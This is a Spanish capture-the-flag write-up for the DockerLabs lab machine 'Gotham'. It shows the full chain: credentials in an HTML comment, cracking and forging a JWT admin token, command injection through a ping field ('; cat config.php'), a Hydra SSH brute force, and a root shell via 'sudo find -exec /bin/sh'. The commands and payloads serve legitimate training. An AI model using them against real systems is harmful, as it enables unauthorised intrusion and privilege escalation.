# Máquina: Gotham — DockerLabs

**Dificultad:** Fácil  
**SO:** Ubuntu 22.04 LTS  
**IP objetivo:** `172.17.0.2`  
**Técnicas:** Credenciales en HTML · JWT cracking · Manipulación de token · Command Injection · Fuerza bruta SSH · sudo find

---

## Flujo del ataque

```
Ping → Nmap (SSH + HTTP) → curl (guest:guest en HTML) → JWT cracking (jwt_tool)
→ Token admin → /admin.php → Command Injection → config.php (contraseña)
→ Hydra (bruce) → SSH → sudo find → root
```

---

## 1. Reconocimiento

### Ping

```bash
ping -c 4 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.068 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.111 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.066 ms
64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.067 ms
4 packets transmitted, 4 received, 0% packet loss
```

TTL = 64 → Sistema Linux confirmado.

### Nmap

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn -oN scan 172.17.0.2
```

| Puerto | Estado | Servicio | Versión                      |
|--------|--------|----------|------------------------------|
| 22/tcp | open   | SSH      | OpenSSH 8.9p1 Ubuntu         |
| 80/tcp | open   | HTTP     | Apache httpd 2.4.52 (Ubuntu) |

Nmap detecta un `robots.txt` con dos entradas deshabilitadas: `/dashboard.php` y `/admin.php`.

---

## 2. Enumeración web

```bash
curl -i http://172.17.0.2
```

El código fuente contiene el siguiente comentario:

```html
<!-- TODO: remove the temporary guest:guest account before go-live -- W.E. -->
```

Credenciales encontradas en comentario HTML: `guest:guest`

---

## 3. Análisis del JWT

Iniciando sesión con `guest:guest`, la aplicación devuelve una cookie de sesión JWT:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4MTY2Nzk5MX0.jTNYDMV19f1SWy37vwTsusWyoau-uHO4foPUru6kZe0
```

Payload decodificado en [jwt.io](https://jwt.io):

```json
{
  "user": "guest",
  "role": "user",
  "iat": 1781667991
}
```

El acceso a `/admin.php` requiere `role: admin`. Para generar un token válido necesitamos la clave secreta con la que está firmado.

---

## 4. JWT Cracking con jwt_tool

```bash
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc4MTY2Nzk5MX0.jTNYDMV19f1SWy37vwTsusWyoau-uHO4foPUru6kZe0 \
  -C -d ~/Desktop/Lists/Rockyou/rockyou.txt
```

```
[+] batman is the CORRECT key!
```

Clave secreta encontrada: `batman`

---

## 5. Manipulación del JWT

Con la clave conocida, generamos un nuevo token con payload modificado:

```json
{
  "user": "admin",
  "role": "admin",
  "iat": 1781667991
}
```

Token resultante (firmado con `batman` / HS256):

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3ODE2Njc5OTF9.rOur5dPTIVcVg56wZh9gveWDjGnEhVV8I25jNxG81Ro
```

Verificación:

```bash
curl -H "Cookie: session=eyJ0eXAi..." http://172.17.0.2/dashboard.php
```

```html
<p>Welcome back, <span class="tag">admin</span></p>
<p>Clearance level: <span class="tag">admin</span></p>
```

Acceso como admin obtenido.

---

## 6. Command Injection en /admin.php

El panel de admin expone una utilidad de ping sin sanitización de input. Inyectando `;` podemos ejecutar comandos adicionales:

```
172.17.0.2; ls
```

```
admin.php
config.php
dashboard.php
index.php
jwt.php
robots.txt
style.css
```

### Lectura de config.php

```
172.17.0.2; cat config.php
```

```php
$DB_PASS = 'Arkh4m_Kn1ght!';   // NOTE(W.E.): misma clave usada en la cuenta de mantenimiento
$JWT_SECRET = 'batman';
```

Contraseña encontrada: `Arkh4m_Kn1ght!`

---

## 7. Acceso inicial — Fuerza bruta SSH

Conocemos la contraseña pero no el usuario. Usamos Hydra con lista de usernames:

```bash
hydra -L ~/Desktop/Lists/SecLists/Usernames/xato-net-10-million-usernames.txt \
  -p Arkh4m_Kn1ght! \
  -o hydrascan.txt \
  ssh://172.17.0.2
```

```
[22][ssh] host: 172.17.0.2   login: bruce   password: Arkh4m_Kn1ght!
```

```bash
ssh bruce@172.17.0.2
# Password: Arkh4m_Kn1ght!
```

---

## 8. Escalada de privilegios — sudo find

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/bin/find
```

```bash
sudo find . -exec /bin/sh \; -quit
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

Mejoramos la shell:

```bash
script /dev/null -c bash
```

Referencia: [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/)

---

## 9. Flags

```bash
cat /home/bruce/user.txt
# d1f4a9c0b7e35628af1029384756bcde

cat /root/root.txt
# a7e2c9f81b6d40539e8170264fbac3d5
```

---

## Credenciales

| Usuario | Contraseña     | Método                                  |
|---------|----------------|-----------------------------------------|
| guest   | guest          | Comentario HTML                         |
| admin   | —              | JWT cracking + manipulación de token    |
| bruce   | Arkh4m_Kn1ght! | Command Injection → config.php + Hydra  |
| root    | —              | sudo find -exec /bin/sh                 |
